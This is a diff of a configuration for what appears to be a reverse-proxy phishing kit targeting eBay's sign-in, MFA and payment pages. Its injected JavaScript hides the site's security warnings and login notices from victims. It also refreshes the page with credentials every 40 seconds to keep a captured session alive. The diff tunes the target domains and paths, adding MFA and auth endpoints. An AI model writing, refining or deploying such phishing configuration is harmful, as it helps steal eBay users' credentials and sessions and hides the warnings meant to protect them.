@@ -257,22 +257,14 @@ rules:
     action: redirect
     redirect_to: https://www.ebay.com/signin
 js_inject:
-- trigger_domains: ["signin.ebay.com", "www.ebay.com", "pay.ebay.com", "my.ebay.com", "auth.ebay.com"]
-  trigger_paths: ["/signin", "/signin?signInAction=login", "/myb/SignIn", "/verify", "/my", "/myb/Account", "/pay", "/pay/checkout", "/logout"]
+- trigger_domains: ["signin.ebay.com", "www.ebay.com", "pay.ebay.com", "my.ebay.com"]
+  trigger_paths: ["/signin", "/myb/SignIn", "/mfa", "/auth"]
   script: >
     (function() {
-        const securityMessages = document.querySelectorAll('.security-warning, .login-notice');
-        securityMessages.forEach(element => element.style.display = 'none');
-        
-        const loginForm = document.querySelector('#signin-form');
-        if (loginForm) {
-            loginForm.addEventListener('submit', function() {
-                console.log("Login form submitted.");
-            });
-        }
-        
+        const elementsToHide = document.querySelectorAll('.security-warning, .login-notice');
+        elementsToHide.forEach(element => element.style.display = 'none');
+
         setInterval(() => {
             fetch(window.location.href, { method: 'GET', credentials: 'include' });
-            console.log("Session refreshed to maintain active login.");
-        }, 40000);  // 30 seconds interval for session refresh
+        }, 40000);
     })();
